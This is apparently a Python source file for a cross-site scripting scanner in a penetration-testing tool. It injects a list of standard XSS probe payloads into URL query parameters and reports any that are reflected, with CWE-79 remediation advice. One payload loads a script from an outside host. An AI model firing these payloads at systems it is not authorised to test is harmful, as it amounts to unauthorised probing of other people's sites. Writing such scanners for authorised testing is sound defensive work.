"""XSS Scanner - Detects Cross-Site Scripting vulnerabilities"""
import asyncio
from typing import Dict, List, Optional
import httpx
import structlog
from urllib.parse import urlparse, parse_qs, urlencode

logger = structlog.get_logger()

class XSSScanner:
    """Cross-Site Scripting vulnerability scanner"""
    
    XSS_PAYLOADS = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg/onload=alert('XSS')>",
        "javascript:alert('XSS')",
        "<iframe src='javascript:alert(\"XSS\")'></iframe>",
        "<body onload=alert('XSS')>",
        "'><script>alert(String.fromCharCode(88,83,83))</script>",
        "\"><script>alert('XSS')</script>",
        "<IMG SRC=\"javascript:alert('XSS');\">",
        "<SCRIPT SRC=http://xss.rocks/xss.js></SCRIPT>"
    ]
    
    def __init__(self):
        self.client = httpx.AsyncClient(timeout=30.0, follow_redirects=True)
    
    async def scan(self, target_url: str, auth_token: Optional[str] = None) -> List[Dict]:
        """Scan for XSS vulnerabilities"""
        vulnerabilities = []
        try:
            logger.info("xss_scan_start", target=target_url)
            headers = {"User-Agent": "BSU-PentestAgent/1.0"}
            if auth_token:
                headers["Authorization"] = f"Bearer {auth_token}"
            
            parsed_url = urlparse(target_url)
            query_params = parse_qs(parsed_url.query)
            
            if not query_params:
                return vulnerabilities
            
            for param_name in query_params:
                for payload in self.XSS_PAYLOADS:
                    test_params = query_params.copy()
                    test_params[param_name] = [payload]
                    test_query = urlencode(test_params, doseq=True)
                    test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{test_query}"
                    
                    response = await self.client.get(test_url, headers=headers)
                    
                    if payload in response.text:
                        vulnerabilities.append({
                            "type": "xss",
                            "name": "Cross-Site Scripting (XSS)",
                            "description": f"XSS vulnerability in parameter '{param_name}'",
                            "severity": "high",
                            "cvss_score": 7.4,
                            "url": target_url,
                            "method": "GET",
                            "parameter": param_name,
                            "payload": payload,
                            "evidence": f"Payload reflected in response",
                            "solution": "Implement proper output encoding and Content Security Policy",
                            "reference": "https://owasp.org/www-community/attacks/xss/",
                            "cwe_id": "CWE-79",
                            "remediation": [
                                "Implement output encoding/escaping",
                                "Use Content Security Policy (CSP)",
                                "Validate and sanitize all user input",
                                "Use HTTP-only cookies",
                                "Implement X-XSS-Protection header"
                            ]
                        })
                        break
            
            logger.info("xss_scan_complete", vulnerabilities_found=len(vulnerabilities))
        except Exception as e:
            logger.error("xss_scan_failed", error=str(e))
        finally:
            await self.client.aclose()
        
        return vulnerabilities
